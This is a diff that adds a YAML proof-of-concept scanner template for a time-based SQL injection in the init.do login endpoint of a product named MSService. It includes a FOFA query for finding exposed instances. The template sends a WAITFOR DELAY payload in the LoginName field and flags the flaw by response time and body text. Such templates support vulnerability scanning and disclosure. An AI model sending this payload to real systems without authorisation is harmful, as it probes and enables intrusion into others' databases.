@@ -1,0 +1,22 @@
+id: poc-yaml-msservice-init-do-sqli
+info:
+  name: MSService服务init.do接口 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: MSService
+  fofa: title="MSService 服务"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /init.do
+  headers:
+    Content-Type: application/json
+  data: '{"LoginName":"1001'' WAITFOR DELAY ''0:0:{{.t1}}''-- znSL","password":"123456"}
+
+    '
+  expression: status_code == 200 && duration >= t1 && duration <= t2 && contains(body,"用户验证失败")
+    && contains(body,"Authority") && contains(body,"ConsultCenterName")
+transport: http
